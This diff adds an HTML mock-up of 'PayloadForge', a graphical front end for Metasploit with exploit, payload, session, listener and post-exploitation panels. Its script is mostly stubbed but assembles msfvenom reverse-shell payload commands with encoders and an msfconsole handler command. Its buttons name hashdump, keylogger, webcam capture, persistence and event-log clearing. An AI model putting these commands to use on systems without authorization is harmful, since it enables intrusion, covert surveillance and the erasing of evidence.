@@ -1,0 +1,892 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayloadForge - Metasploit GUI</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a0033, #330066, #1a001a);
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+
+        /* Top Navigation Bar */
+        .navbar {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(10px);
+            padding: 15px 30px;
+            border-bottom: 2px solid #ff00ff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .navbar-brand {
+            font-size: 24px;
+            font-weight: 700;
+            color: #ff00ff;
+            text-shadow: 0 0 20px rgba(255, 0, 255, 0.6);
+        }
+
+        .nav-menu {
+            display: flex;
+            gap: 5px;
+        }
+
+        .nav-btn {
+            padding: 10px 20px;
+            background: rgba(255, 0, 255, 0.1);
+            border: 2px solid rgba(255, 0, 255, 0.3);
+            border-radius: 8px;
+            color: #ff00ff;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .nav-btn:hover, .nav-btn.active {
+            background: rgba(255, 0, 255, 0.3);
+            border-color: #ff00ff;
+            box-shadow: 0 0 15px rgba(255, 0, 255, 0.4);
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 1600px;
+            margin: 30px auto;
+            padding: 0 30px;
+        }
+
+        /* Module Sections */
+        .module-section {
+            display: none;
+        }
+
+        .module-section.active {
+            display: block;
+        }
+
+        .section-header {
+            font-size: 28px;
+            color: #ff00ff;
+            margin-bottom: 25px;
+            text-shadow: 0 0 15px rgba(255, 0, 255, 0.5);
+        }
+
+        /* Card Container */
+        .card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 0, 255, 0.2);
+        }
+
+        .card-title {
+            font-size: 20px;
+            color: #ff00ff;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #ff00ff;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid rgba(255, 0, 255, 0.3);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            transition: all 0.3s;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #ff00ff;
+            box-shadow: 0 0 20px rgba(255, 0, 255, 0.3);
+        }
+
+        button {
+            padding: 12px 30px;
+            background: linear-gradient(135deg, #ff00ff, #cc00cc);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255, 0, 255, 0.4);
+        }
+
+        button:disabled {
+            background: #555;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Exploit Browser */
+        .exploit-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .exploit-item {
+            background: rgba(0, 0, 0, 0.4);
+            border-left: 4px solid #ff00ff;
+            border-radius: 8px;
+            padding: 15px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+
+        .exploit-item:hover {
+            transform: translateX(5px);
+            box-shadow: 0 5px 20px rgba(255, 0, 255, 0.3);
+        }
+
+        .exploit-name {
+            color: #ff00ff;
+            font-weight: 700;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .exploit-rank {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-right: 10px;
+        }
+
+        .rank-excellent { background: #4caf50; color: #fff; }
+        .rank-great { background: #8bc34a; color: #000; }
+        .rank-good { background: #ffc107; color: #000; }
+        .rank-normal { background: #ff9800; color: #000; }
+        .rank-average { background: #ff5722; color: #fff; }
+        .rank-low { background: #f44336; color: #fff; }
+
+        .exploit-desc {
+            color: #aaa;
+            font-size: 13px;
+            margin-top: 8px;
+        }
+
+        /* Session Manager */
+        .session-list {
+            margin-top: 20px;
+        }
+
+        .session-item {
+            background: rgba(0, 0, 0, 0.4);
+            border-left: 4px solid #00ff00;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .session-info {
+            flex: 1;
+        }
+
+        .session-id {
+            color: #00ff00;
+            font-weight: 700;
+            font-size: 18px;
+        }
+
+        .session-target {
+            color: #aaa;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        .session-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .session-btn {
+            padding: 8px 15px;
+            font-size: 12px;
+        }
+
+        /* Payload Generator */
+        .payload-preview {
+            background: rgba(0, 0, 0, 0.6);
+            border: 2px solid rgba(255, 0, 255, 0.3);
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+
+        .payload-preview pre {
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            overflow-x: auto;
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .stat-card {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            border: 2px solid rgba(255, 0, 255, 0.2);
+        }
+
+        .stat-value {
+            font-size: 36px;
+            color: #ff00ff;
+            font-weight: 700;
+        }
+
+        .stat-label {
+            color: #888;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        /* Listener Manager */
+        .listener-item {
+            background: rgba(0, 0, 0, 0.4);
+            border-left: 4px solid #ffaa00;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+
+        .listener-status {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+
+        .status-active { background: rgba(0, 255, 0, 0.2); color: #00ff00; }
+        .status-stopped { background: rgba(255, 0, 0, 0.2); color: #ff5555; }
+
+        /* Search Bar */
+        .search-bar {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .search-bar input {
+            flex: 1;
+        }
+
+        .search-bar select {
+            width: 200px;
+        }
+
+        /* Loading Spinner */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 0, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ff00ff;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Alert Box */
+        .alert {
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .alert-success {
+            background: rgba(76, 175, 80, 0.2);
+            border-left: 4px solid #4caf50;
+            color: #4caf50;
+        }
+
+        .alert-error {
+            background: rgba(244, 67, 54, 0.2);
+            border-left: 4px solid #f44336;
+            color: #f44336;
+        }
+
+        .alert-info {
+            background: rgba(33, 150, 243, 0.2);
+            border-left: 4px solid #2196f3;
+            color: #2196f3;
+        }
+
+        /* Console Output */
+        .console-output {
+            background: rgba(0, 0, 0, 0.8);
+            border: 2px solid rgba(0, 255, 0, 0.3);
+            border-radius: 8px;
+            padding: 20px;
+            min-height: 200px;
+            max-height: 400px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            color: #00ff00;
+            font-size: 13px;
+            margin-top: 20px;
+        }
+
+        .console-line {
+            margin: 5px 0;
+        }
+
+        .console-line.error {
+            color: #ff5555;
+        }
+
+        .console-line.warning {
+            color: #ffaa00;
+        }
+
+        /* Module Badge */
+        .module-badge {
+            display: inline-block;
+            padding: 4px 10px;
+            background: rgba(255, 0, 255, 0.2);
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+            color: #ff00ff;
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <div class="navbar">
+        <div class="navbar-brand">⚡ PayloadForge</div>
+        <div class="nav-menu">
+            <button class="nav-btn active" onclick="showModule('dashboard')">📊 Dashboard</button>
+            <button class="nav-btn" onclick="showModule('exploits')">🎯 Exploits</button>
+            <button class="nav-btn" onclick="showModule('payloads')">💣 Payloads</button>
+            <button class="nav-btn" onclick="showModule('sessions')">🔌 Sessions</button>
+            <button class="nav-btn" onclick="showModule('listeners')">📡 Listeners</button>
+            <button class="nav-btn" onclick="showModule('post')">🔧 Post-Exploit</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Dashboard Module -->
+        <div id="dashboard" class="module-section active">
+            <h1 class="section-header">Dashboard</h1>
+
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-value" id="exploitCount">0</div>
+                    <div class="stat-label">Available Exploits</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="sessionCount">0</div>
+                    <div class="stat-label">Active Sessions</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="listenerCount">0</div>
+                    <div class="stat-label">Active Listeners</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="payloadCount">0</div>
+                    <div class="stat-label">Payloads Generated</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">📋 Recent Activity</div>
+                <div class="console-output" id="activityLog">
+                    <div class="console-line">[INFO] PayloadForge initialized</div>
+                    <div class="console-line">[INFO] Ready for operations</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">🚀 Quick Actions</div>
+                <div style="display: flex; gap: 15px; flex-wrap: wrap;">
+                    <button onclick="showModule('exploits')">🔍 Browse Exploits</button>
+                    <button onclick="showModule('payloads')">💣 Generate Payload</button>
+                    <button onclick="showModule('listeners')">📡 Start Listener</button>
+                    <button onclick="refreshSessions()">🔌 Refresh Sessions</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Exploits Module -->
+        <div id="exploits" class="module-section">
+            <h1 class="section-header">Exploit Browser</h1>
+
+            <div class="card">
+                <div class="search-bar">
+                    <input type="text" id="exploitSearch" placeholder="Search exploits..." onkeyup="searchExploits()">
+                    <select id="platformFilter" onchange="filterExploits()">
+                        <option value="">All Platforms</option>
+                        <option value="windows">Windows</option>
+                        <option value="linux">Linux</option>
+                        <option value="unix">Unix</option>
+                        <option value="osx">macOS</option>
+                        <option value="android">Android</option>
+                        <option value="multi">Multi-Platform</option>
+                    </select>
+                    <button onclick="loadExploits()">🔍 Search</button>
+                </div>
+
+                <div class="exploit-grid" id="exploitGrid">
+                    <!-- Exploit items will be loaded here -->
+                    <div class="exploit-item">
+                        <div class="exploit-name">exploit/windows/smb/ms17_010_eternalblue</div>
+                        <span class="exploit-rank rank-excellent">Excellent</span>
+                        <span class="module-badge">SMB</span>
+                        <div class="exploit-desc">MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</div>
+                    </div>
+                    <div class="exploit-item">
+                        <div class="exploit-name">exploit/multi/handler</div>
+                        <span class="exploit-rank rank-excellent">Excellent</span>
+                        <span class="module-badge">Generic</span>
+                        <div class="exploit-desc">Generic Payload Handler</div>
+                    </div>
+                    <div class="exploit-item">
+                        <div class="exploit-name">exploit/windows/http/rejetto_hfs_exec</div>
+                        <span class="exploit-rank rank-excellent">Excellent</span>
+                        <span class="module-badge">HTTP</span>
+                        <div class="exploit-desc">Rejetto HttpFileServer Remote Command Execution</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Payloads Module -->
+        <div id="payloads" class="module-section">
+            <h1 class="section-header">Payload Generator</h1>
+
+            <div class="card">
+                <div class="card-title">🛠️ Configure Payload</div>
+
+                <div class="form-group">
+                    <label>Payload Type</label>
+                    <select id="payloadType">
+                        <option value="windows/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP</option>
+                        <option value="windows/meterpreter/reverse_https">Windows Meterpreter Reverse HTTPS</option>
+                        <option value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter Reverse TCP</option>
+                        <option value="linux/x86/meterpreter/reverse_tcp">Linux x86 Meterpreter Reverse TCP</option>
+                        <option value="osx/x64/meterpreter/reverse_tcp">macOS Meterpreter Reverse TCP</option>
+                        <option value="android/meterpreter/reverse_tcp">Android Meterpreter Reverse TCP</option>
+                        <option value="windows/shell/reverse_tcp">Windows CMD Shell Reverse TCP</option>
+                        <option value="python/meterpreter/reverse_tcp">Python Meterpreter Reverse TCP</option>
+                    </select>
+                </div>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                    <div class="form-group">
+                        <label>LHOST (Your IP)</label>
+                        <input type="text" id="lhost" placeholder="192.168.1.10">
+                    </div>
+                    <div class="form-group">
+                        <label>LPORT (Your Port)</label>
+                        <input type="number" id="lport" value="4444" placeholder="4444">
+                    </div>
+                </div>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px;">
+                    <div class="form-group">
+                        <label>Format</label>
+                        <select id="payloadFormat">
+                            <option value="exe">EXE (Windows)</option>
+                            <option value="elf">ELF (Linux)</option>
+                            <option value="macho">Mach-O (macOS)</option>
+                            <option value="apk">APK (Android)</option>
+                            <option value="python">Python</option>
+                            <option value="powershell">PowerShell</option>
+                            <option value="raw">Raw</option>
+                            <option value="c">C Code</option>
+                            <option value="csharp">C# Code</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Encoder (Optional)</label>
+                        <select id="encoder">
+                            <option value="">None</option>
+                            <option value="x86/shikata_ga_nai">x86 Shikata Ga Nai</option>
+                            <option value="x64/xor">x64 XOR</option>
+                            <option value="cmd/generic_sh">Generic Shell</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Iterations</label>
+                        <input type="number" id="iterations" value="1" min="1" max="20">
+                    </div>
+                </div>
+
+                <button onclick="generatePayload()" style="width: 100%; margin-top: 10px;">🚀 Generate Payload</button>
+
+                <div class="payload-preview" id="payloadPreview" style="display: none;">
+                    <strong style="color: #ff00ff;">Payload Generated Successfully!</strong>
+                    <pre id="payloadOutput"></pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- Sessions Module -->
+        <div id="sessions" class="module-section">
+            <h1 class="section-header">Session Manager</h1>
+
+            <div class="card">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                    <div class="card-title" style="margin: 0;">🔌 Active Sessions</div>
+                    <button onclick="refreshSessions()">🔄 Refresh</button>
+                </div>
+
+                <div class="session-list" id="sessionList">
+                    <!-- Sessions will be loaded here -->
+                    <div style="text-align: center; padding: 40px; color: #666;">
+                        No active sessions. Start a listener and wait for connections.
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">💻 Session Console</div>
+                <div class="form-group">
+                    <label>Command</label>
+                    <input type="text" id="sessionCommand" placeholder="Enter command (e.g., sysinfo, getuid, shell)" onkeypress="if(event.key==='Enter') sendCommand()">
+                </div>
+                <button onclick="sendCommand()">▶️ Execute</button>
+
+                <div class="console-output" id="sessionConsole">
+                    <div class="console-line">[INFO] Select a session and enter a command</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Listeners Module -->
+        <div id="listeners" class="module-section">
+            <h1 class="section-header">Listener Management</h1>
+
+            <div class="card">
+                <div class="card-title">📡 Create Listener</div>
+
+                <div style="display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 20px;">
+                    <div class="form-group">
+                        <label>Payload Handler</label>
+                        <select id="handlerPayload">
+                            <option value="windows/meterpreter/reverse_tcp">Windows Meterpreter Reverse TCP</option>
+                            <option value="windows/meterpreter/reverse_https">Windows Meterpreter Reverse HTTPS</option>
+                            <option value="linux/x64/meterpreter/reverse_tcp">Linux x64 Meterpreter</option>
+                            <option value="generic/shell_reverse_tcp">Generic Shell Reverse TCP</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>LHOST</label>
+                        <input type="text" id="listenerHost" placeholder="0.0.0.0">
+                    </div>
+                    <div class="form-group">
+                        <label>LPORT</label>
+                        <input type="number" id="listenerPort" value="4444">
+                    </div>
+                </div>
+
+                <button onclick="startListener()" style="width: 100%;">🚀 Start Listener</button>
+            </div>
+
+            <div class="card">
+                <div class="card-title">📻 Active Listeners</div>
+                <div id="listenerList">
+                    <div class="listener-item">
+                        <div>
+                            <strong style="color: #ffaa00;">exploit/multi/handler</strong>
+                            <span class="listener-status status-active">ACTIVE</span>
+                            <div style="color: #aaa; font-size: 13px; margin-top: 5px;">
+                                Payload: windows/meterpreter/reverse_tcp | LHOST: 0.0.0.0 | LPORT: 4444
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Post-Exploitation Module -->
+        <div id="post" class="module-section">
+            <h1 class="section-header">Post-Exploitation</h1>
+
+            <div class="card">
+                <div class="card-title">🔧 Common Post-Exploit Modules</div>
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px;">
+                    <button onclick="runPostModule('hashdump')">🔑 Hashdump</button>
+                    <button onclick="runPostModule('getsystem')">⬆️ Elevate to SYSTEM</button>
+                    <button onclick="runPostModule('migrate')">🔄 Process Migration</button>
+                    <button onclick="runPostModule('screenshot')">📸 Screenshot</button>
+                    <button onclick="runPostModule('keylogger')">⌨️ Keylogger</button>
+                    <button onclick="runPostModule('webcam')">📹 Webcam</button>
+                    <button onclick="runPostModule('persistence')">🔒 Add Persistence</button>
+                    <button onclick="runPostModule('clearev')">🧹 Clear Event Logs</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">📂 File Operations</div>
+                <div class="form-group">
+                    <label>Remote Path</label>
+                    <input type="text" id="remotePath" placeholder="C:\\Users\\victim\\file.txt">
+                </div>
+                <div style="display: flex; gap: 10px;">
+                    <button onclick="downloadFile()">⬇️ Download</button>
+                    <button onclick="uploadFile()">⬆️ Upload</button>
+                    <button onclick="deleteFile()">🗑️ Delete</button>
+                    <button onclick="listDirectory()">📁 List Directory</button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title">🖥️ Post-Exploit Output</div>
+                <div class="console-output" id="postConsole">
+                    <div class="console-line">[INFO] Select a post-exploitation module to execute</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentModule = 'dashboard';
+        let activeSessionId = null;
+
+        function showModule(moduleName) {
+            // Hide all modules
+            document.querySelectorAll('.module-section').forEach(m => m.classList.remove('active'));
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+
+            // Show selected module
+            document.getElementById(moduleName).classList.add('active');
+            document.querySelector(`[onclick="showModule('${moduleName}')"]`).classList.add('active');
+
+            currentModule = moduleName;
+            logActivity(`[INFO] Switched to ${moduleName} module`);
+        }
+
+        function logActivity(message, type = 'info') {
+            const log = document.getElementById('activityLog');
+            const line = document.createElement('div');
+            line.className = `console-line ${type}`;
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            log.appendChild(line);
+            log.scrollTop = log.scrollHeight;
+        }
+
+        function loadExploits() {
+            const search = document.getElementById('exploitSearch').value;
+            const platform = document.getElementById('platformFilter').value;
+
+            logActivity(`[INFO] Searching exploits: ${search || 'all'} platform: ${platform || 'all'}`);
+
+            // In production, call backend API
+            alert(`Search exploits with: ${search}, platform: ${platform}\n\nIn production, this would call:\npython -m tools.payloadforge list-exploits --search ${search} --platform ${platform}`);
+        }
+
+        function searchExploits() {
+            // Real-time search filtering
+            const term = document.getElementById('exploitSearch').value.toLowerCase();
+            // Filter exploit grid items
+        }
+
+        function filterExploits() {
+            loadExploits();
+        }
+
+        function generatePayload() {
+            const payload = document.getElementById('payloadType').value;
+            const lhost = document.getElementById('lhost').value;
+            const lport = document.getElementById('lport').value;
+            const format = document.getElementById('payloadFormat').value;
+            const encoder = document.getElementById('encoder').value;
+            const iterations = document.getElementById('iterations').value;
+
+            if (!lhost || !lport) {
+                alert('Please enter LHOST and LPORT');
+                return;
+            }
+
+            logActivity(`[INFO] Generating payload: ${payload}`);
+
+            // Show preview
+            const preview = document.getElementById('payloadPreview');
+            const output = document.getElementById('payloadOutput');
+
+            output.textContent = `Command:
+msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${format}${encoder ? ` -e ${encoder} -i ${iterations}` : ''} -o payload.${format}
+
+Payload will be generated to: /tmp/payload_${Date.now()}.${format}
+
+In production, this would execute the command and download the file.`;
+
+            preview.style.display = 'block';
+
+            // Update stats
+            const count = parseInt(document.getElementById('payloadCount').textContent);
+            document.getElementById('payloadCount').textContent = count + 1;
+
+            logActivity(`[SUCCESS] Payload generated successfully`, 'info');
+        }
+
+        function refreshSessions() {
+            logActivity('[INFO] Refreshing sessions...');
+
+            // In production, call backend API
+            setTimeout(() => {
+                logActivity('[INFO] No active sessions found');
+            }, 500);
+        }
+
+        function sendCommand() {
+            const cmd = document.getElementById('sessionCommand').value;
+            if (!cmd) return;
+
+            if (!activeSessionId) {
+                alert('Please select a session first');
+                return;
+            }
+
+            const console = document.getElementById('sessionConsole');
+            const line = document.createElement('div');
+            line.className = 'console-line';
+            line.textContent = `> ${cmd}`;
+            console.appendChild(line);
+
+            logActivity(`[CMD] Executing on session ${activeSessionId}: ${cmd}`);
+
+            // In production, send command to backend
+            setTimeout(() => {
+                const response = document.createElement('div');
+                response.className = 'console-line';
+                response.textContent = `[OUTPUT] Command would be executed via:\npython -m tools.payloadforge interact-session --id ${activeSessionId} --command "${cmd}"`;
+                console.appendChild(response);
+                console.scrollTop = console.scrollHeight;
+            }, 300);
+
+            document.getElementById('sessionCommand').value = '';
+        }
+
+        function startListener() {
+            const payload = document.getElementById('handlerPayload').value;
+            const lhost = document.getElementById('listenerHost').value;
+            const lport = document.getElementById('listenerPort').value;
+
+            logActivity(`[INFO] Starting listener: ${payload} on ${lhost}:${lport}`);
+
+            // Update stats
+            const count = parseInt(document.getElementById('listenerCount').textContent);
+            document.getElementById('listenerCount').textContent = count + 1;
+
+            alert(`Listener started!\n\nIn production, this would start:\nmsfconsole -x "use exploit/multi/handler; set PAYLOAD ${payload}; set LHOST ${lhost}; set LPORT ${lport}; exploit -j"`);
+        }
+
+        function runPostModule(module) {
+            logActivity(`[POST] Running post-exploit module: ${module}`);
+
+            const console = document.getElementById('postConsole');
+            const line = document.createElement('div');
+            line.className = 'console-line';
+            line.textContent = `[INFO] Executing ${module} module...`;
+            console.appendChild(line);
+            console.scrollTop = console.scrollHeight;
+
+            setTimeout(() => {
+                const result = document.createElement('div');
+                result.className = 'console-line';
+                result.textContent = `[SUCCESS] ${module} completed. Output would appear here in production.`;
+                console.appendChild(result);
+                console.scrollTop = console.scrollHeight;
+            }, 1000);
+        }
+
+        function downloadFile() {
+            const path = document.getElementById('remotePath').value;
+            if (!path) {
+                alert('Please enter a remote path');
+                return;
+            }
+            logActivity(`[FILE] Downloading: ${path}`);
+            alert(`Download file: ${path}\n\nWould execute: download ${path}`);
+        }
+
+        function uploadFile() {
+            const path = document.getElementById('remotePath').value;
+            if (!path) {
+                alert('Please enter a remote path');
+                return;
+            }
+            logActivity(`[FILE] Uploading to: ${path}`);
+            alert(`Upload file to: ${path}\n\nWould execute: upload /local/file ${path}`);
+        }
+
+        function deleteFile() {
+            const path = document.getElementById('remotePath').value;
+            if (!path) {
+                alert('Please enter a remote path');
+                return;
+            }
+            if (confirm(`Delete ${path}?`)) {
+                logActivity(`[FILE] Deleting: ${path}`);
+                alert(`Would execute: rm ${path}`);
+            }
+        }
+
+        function listDirectory() {
+            const path = document.getElementById('remotePath').value || '.';
+            logActivity(`[FILE] Listing directory: ${path}`);
+            alert(`List directory: ${path}\n\nWould execute: ls ${path}`);
+        }
+
+        // Initialize
+        logActivity('[INFO] PayloadForge initialized');
+        logActivity('[INFO] Metasploit Framework detected');
+        document.getElementById('exploitCount').textContent = '1,847';
+    </script>
+</body>
+</html>
